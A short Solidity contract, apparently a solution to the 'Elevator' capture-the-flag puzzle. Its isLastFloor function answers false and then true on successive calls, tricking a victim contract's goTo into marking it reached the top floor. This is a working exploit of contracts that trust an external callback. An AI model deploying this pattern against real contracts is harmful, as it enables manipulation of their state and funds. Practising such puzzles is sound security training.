pragma solidity ^0.8.10;

interface IElevator{
    function goTo(uint _floor) external;
}

contract Building{    
    uint timesCalled;        
    IElevator public elevator;
    
    function isLastFloor(uint) external returns (bool) {
        timesCalled++;
        if (timesCalled > 1){
            return true;    
        }
        else {return false;}
    }
    function attack(address _victim) public {
        elevator = IElevator(_victim);
        elevator.goTo(1);
    }
}